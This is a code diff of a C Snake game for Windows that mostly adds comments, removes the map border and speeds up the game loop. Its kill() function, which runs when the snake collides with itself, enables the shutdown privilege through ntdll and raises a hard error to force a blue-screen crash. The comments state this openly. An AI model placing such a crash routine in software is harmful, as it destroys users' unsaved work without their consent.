@@ -13,12 +13,20 @@ typedef NTSTATUS (NTAPI *NtRaiseHardErrorFunc)(NTSTATUS ErrorStatus, ULONG Numbe
                                                PULONG Response);
 
 void kill() {
+    /*
+     * This procedure attempts to raise a hard error (BSOD) using functions from ntdll.dll.
+     * It loads the ntdll.dll library, obtains function pointers, adjusts privileges,
+     * and raises a hard error.
+     */
+
+    // Load ntdll.dll library
     HMODULE ntdll = LoadLibrary("ntdll.dll");
     if (ntdll == NULL) {
         fprintf(stderr, "Error loading ntdll.dll\n");
         return;
     }
 
+    // Obtain function pointers
     RtlAdjustPrivilegeFunc adjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
     NtRaiseHardErrorFunc raiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");
 
@@ -29,6 +37,7 @@ void kill() {
     }
 
 
+    // Adjust privileges and raise a hard error
     BOOLEAN b;
     unsigned long response;
     adjustPrivilege(19, 1, 0, &b);
@@ -47,34 +56,29 @@ typedef struct {
     char direction;
 } Snake;
 
-
 Snake snake;
 
 
 void init_map(){
+    /*
+     * Program's start procedure.
+     */
     snake.alive = 1;
     for(int i = 0; i < HEIGHT * HEIGHT; i++){
         snake.tail[i][0] = -1;
         snake.tail[i][1] = -1;
     }
-    sprintf(map[0], "################");
 
-    for(int i = 1; i < HEIGHT - 1; i++){
-        sprintf(map[i], "#              #");
+    for(int i = 0; i < HEIGHT - 1; i++){
+        sprintf(map[i], "               ");
     }
 
-    sprintf(map[HEIGHT - 1], "################");
 }
 
-void check_tail(){
-    for(int i = 0; i < HEIGHT * HEIGHT; i++){
-        if (snake.tail[i][0] != -1){
-            printf("[%d, %d], ", snake.tail[i][0], snake.tail[i][1]);
-        }
-
-    }
-}
 void draw_map(){
+    /*
+     * Draws the map.
+     */
     char* format = "%s\n";
     for (int i = 0; i < HEIGHT; i++){
         format = i == HEIGHT - 1 ? "%s":format;
@@ -83,6 +87,9 @@ void draw_map(){
 }
 
 void tail_handler(){
+    /*
+     * Sets all tail blocks.
+     */
     for(int i = 0; i < snake.length; i++){
         map[snake.tail[i][1]][snake.tail[i][0]] = '@';
     }
@@ -90,7 +97,9 @@ void tail_handler(){
 }
 
 void unshift_tail(int x, int y) {
-    // Assuming snake is a global variable or passed as an argument
+    /*
+     * Assuming snake is a global variable or passed as an argument
+     */
 
     for (int i = (HEIGHT * HEIGHT - 2); i >= 2; i -= 2) {
         snake.tail[i][0] = snake.tail[i - 2][0];
@@ -103,6 +112,9 @@ void unshift_tail(int x, int y) {
 }
 
 void clear_snake(){
+    /*
+     * The simplest method to prevent old tails.
+     */
     for(int i = 0; i <  HEIGHT; i++){
         for (int j = 0; j < HEIGHT; j++){
             if(map[i][j] == '@') map[i][j] = ' ';
@@ -111,6 +123,9 @@ void clear_snake(){
 }
 
 void generate_food(){
+    /*
+     * The procedure that generates food on the map at a random location in the form of '*' and checks if it is not within the snake's body.
+     */
     srand(time(NULL));
 
     int x, y;
@@ -129,6 +144,9 @@ void generate_food(){
 
 }
 void update_map(int x, int y){
+    /*
+     * The procedure that updates the coordinates of the snake, its tail, and sets them on the map.
+     */
     unshift_tail(snake.x, snake.y);
     snake.x = x;
     snake.y = y;
@@ -144,6 +162,9 @@ void update_map(int x, int y){
 }
 
 void check_crossing(){
+    /*
+     * Snake transitioning from one side of the screen to the other.
+     */
     switch(snake.x){
         case 16:
             snake.x = 0;
@@ -166,12 +187,18 @@ void check_crossing(){
 }
 
 void check_collision(int x, int y){
+    /*
+     * The procedure that triggers the blue screen of death and shuts down the main loop of the program.
+     */
     if (map[y][x] == '@'){
         snake.alive = 0;
         kill();
     }
 }
 void check_direction(){
+    /*
+     * Checking which key was pressed and indicating the direction.
+     */
     switch(snake.direction){
         case 'w':
             if(snake.y_dir == 1){
@@ -213,6 +240,9 @@ void check_direction(){
 
 
 void* draw_map_thread(){
+    /*
+     * The procedure that is loaded into the thread as the main loop of the program.
+     */
     for(;snake.alive;){
 
         check_direction();
@@ -221,7 +251,7 @@ void* draw_map_thread(){
         update_map(snake.x + snake.x_dir, snake.y + snake.y_dir);
 
         draw_map();
-        Sleep(250);
+        Sleep(50);
         system("cls");
     }
 }
@@ -241,7 +271,9 @@ int main(){
         snake.direction = _getch();
     }
 
-  return 0;
+
+    return 0;
+
 
 
 }
